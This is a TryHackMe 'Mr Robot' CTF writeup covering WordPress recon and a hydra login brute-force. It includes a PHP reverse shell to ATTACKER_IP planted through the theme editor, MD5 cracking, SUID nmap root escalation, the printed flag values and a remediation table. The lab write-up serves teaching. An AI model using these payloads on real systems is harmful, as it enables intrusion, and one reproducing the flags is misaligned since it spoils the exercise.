# 🤖 Mr Robot CTF — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20WordPress%20%7C%20SUID%20Exploit-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)  
> **Date:** May 2026  
> **Room:** [Mr Robot CTF](https://tryhackme.com/room/mrrobot)

---

## 📋 Executive Summary

This writeup documents the full exploitation of the **Mr Robot CTF** machine. The attack chain demonstrates a progression starting with information disclosure via `robots.txt`, credential recovery from a WordPress backup, authenticated remote code execution through WordPress theme editor, and finally privilege escalation via a misconfigured SUID `nmap` binary.

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| `nmap` | Network discovery |
| `gobuster` | Directory enumeration |
| `hydra` | Username brute-force |
| `john` | Password hash cracking |
| `nc` | Reverse shell listener |

---

## 🔍 Phase 1: Reconnaissance & Enumeration

### Network Scanning

```bash
nmap -sV -sC -T4 <TARGET_IP>
```

### Findings

| Port | Status | Service | Version |
|------|--------|---------|---------|
| 22/tcp | filtered | SSH | OpenSSH |
| 80/tcp | open | HTTP | Apache httpd |
| 443/tcp | open | HTTP | Apache httpd |

### Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Discovered Paths:**

| Path | Content | Significance |
|------|---------|--------------|
| `/robots.txt` | File disclosure | Contains `fsocity.dic` wordlist and `key-1-of-3.txt` |
| `/wp-login.php` | WordPress login | Primary authentication point |
| `/license` | Base64 encoded credentials | Contains `elliot:ER28-0652` |
| `/wp-content/themes/` | WordPress themes | RCE vector via theme editor |

---

## 🔑 Phase 2: Key 1 — Information Disclosure

### robots.txt Analysis

```bash
curl http://<TARGET_IP>/robots.txt
```

**Contents:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Key Retrieval

```bash
wget http://<TARGET_IP>/key-1-of-3.txt
cat key-1-of-3.txt
```

**Key 1:** `073403c8a58a1f80d943455fb30724b9`

---

## 🎭 Phase 3: WordPress Credential Recovery

### Wordlist Processing

The `fsocity.dic` file contains 858,000+ lines with massive duplication. Optimized for brute-force:

```bash
sort fsocity.dic | uniq > fsocity-clean.dic
# 858,000 → 11,000 lines (98.7% reduction)
```

### Username Brute-Force

```bash
hydra -L fsocity-clean.dic -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

**Result:** Username `elliot` identified.

### Password Recovery

The `/license` file contains base64-encoded credentials:

```bash
curl http://<TARGET_IP>/license | base64 -d
# elliot:ER28-0652
```

**Login:** `elliot / ER28-0652`

---

## 🐚 Phase 4: Authenticated RCE & Shell

### WordPress Theme Editor Exploitation

Navigated to **Appearance → Editor → archive.php**. Replaced content with PHP reverse shell:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 9001;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### Reverse Shell Execution

**Listener:**
```bash
nc -lvnp 9001
```

**Trigger:**
```
http://<TARGET_IP>/wp-content/themes/twentyfifteen/archive.php
```

**Result:** Shell obtained as `daemon` user.

---

## 🏴 Phase 5: User Flag (Key 2)

### Lateral Movement to robot

In `/home/robot`, two files found:
- `key-2-of-3.txt` — unreadable (robot ownership)
- `password.raw-md5` — MD5 hash, readable

### Hash Extraction & Cracking

```bash
cat password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** `abcdefghijklmnopqrstuvwxyz`

### Interactive Shell Upgrade

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su robot
# Password: abcdefghijklmnopqrstuvwxyz
```

### Key 2 Retrieval

```bash
cat /home/robot/key-2-of-3.txt
```

**Key 2:** `822c73956184f694993bede3eb39f959`

---

## 🚀 Phase 6: Privilege Escalation & Root

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Critical Finding:** `/usr/local/bin/nmap` with SUID bit set.

### nmap SUID Exploitation

GTFOBins confirms nmap interactive mode spawns shell:

```bash
/usr/local/bin/nmap --interactive
nmap> !sh
whoami
# root
```

### Key 3 Retrieval

```bash
cat /root/key-3-of-3.txt
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## 🗺️ Attack Chain Visualization

```
[Attacker]
    │
    ├───nmap───► [Target: 22(filtered), 80, 443]
    │                │
    │                ▼
    │        [gobuster: /robots.txt, /wp-login.php, /license]
    │                │
    │                ▼
    │        [robots.txt: key-1-of-3.txt + fsocity.dic]
    │                │
    │                ▼
    │        [Key 1: 073403c8a58a1f80d943455fb30724b9]
    │                │
    │                ▼
    │        [Process fsocity.dic: 858K → 11K unique]
    │                │
    │                ▼
    │        [hydra: username = elliot]
    │                │
    │                ▼
    │        [/license: base64 decode → elliot:ER28-0652]
    │                │
    │                ▼
    │        [WordPress admin login]
    │                │
    │                ▼
    │        [Theme Editor: archive.php → reverse shell]
    │                │
    │                ▼
    │        [Shell as daemon]
    │                │
    │                ▼
    │        [/home/robot: password.raw-md5]
    │                │
    │                ▼
    │        [john: abcdefghijklmnopqrstuvwxyz]
    │                │
    │                ▼
    │        [su robot → Key 2: 822c73956184f694993bede3eb39f959]
    │                │
    │                ▼
    │        [SUID nmap → !sh]
    │                │
    │                ▼
    └────────► [Root shell → Key 3: 04787ddef27c3dee1ee161b21670b4e4]
```

---

## 🛡️ Vulnerability Assessment & Remediation

| # | Vulnerability | Severity | CVSS | Remediation |
|---|---------------|----------|------|-------------|
| 1 | **Sensitive File Disclosure (robots.txt)** | 🔴 Critical | 8.6 | Remove sensitive files from web root; implement proper access controls |
| 2 | **WordPress Backup Exposure** | 🔴 Critical | 9.1 | Restrict backup file access; store outside web root; encrypt backups |
| 3 | **Weak Password Hashing (MD5)** | 🔴 Critical | 9.8 | Migrate to bcrypt/Argon2; enforce strong password policies |
| 4 | **WordPress Theme Editor RCE** | 🔴 Critical | 9.9 | Disable theme/plugin editor; restrict file permissions; apply WAF rules |
| 5 | **SUID nmap Misconfiguration** | 🔴 Critical | 9.0 | Remove SUID bit from nmap; use dedicated privileged binaries |
| 6 | **SSH Filtered/Exposed** | 🟠 High | 7.5 | Properly configure firewall rules; either open or close SSH definitively |

---

## 🎓 Key Takeaways

1. **robots.txt is not security:** It explicitly tells attackers where to look — never store sensitive files there
2. **WordPress theme editor = RCE vector:** Any admin-level compromise becomes instant code execution
3. **MD5 is broken:** Rainbow tables crack MD5 in seconds — never use for password storage
4. **SUID binaries are dangerous:** nmap with SUID is a known exploit vector — audit all SUID files regularly
5. **License files leak credentials:** Base64 is not encryption — always inspect "hidden" files

---

## 🚩 Flags

| Flag | Location | Value |
|------|----------|-------|
| **Key 1** | `/key-1-of-3.txt` | `073403c8a58a1f80d943455fb30724b9` |
| **Key 2** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| **Key 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |

---

> **⚠️ Disclaimer:** This writeup is for educational and research purposes only. Always obtain explicit written authorization before testing systems you do not own.

---

**Author:** Miraç Akkuş (LatenT)  
**Date:** May 2026
